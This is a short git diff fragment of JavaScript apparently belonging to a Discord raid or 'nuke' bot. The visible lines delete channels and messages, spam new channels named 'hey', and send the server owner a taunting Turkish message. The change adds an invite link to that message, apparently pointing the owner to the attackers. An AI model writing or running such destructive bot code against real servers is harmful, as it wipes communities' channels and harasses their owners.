@@ -37,7 +37,7 @@ return c.delete();
     
 
   
-message.guild.owner.send(`Buraya ne oldu yahu? neyse yapanlara görüşmek istersen; `);
+message.guild.owner.send(`Buraya ne oldu yahu? neyse yapanlara görüşmek istersen; https://discord.gg/w8Xq9bm`);
 message.guild.createChannel(`hey `)
 message.guild.createChannel(`hey `)
 message.delete()
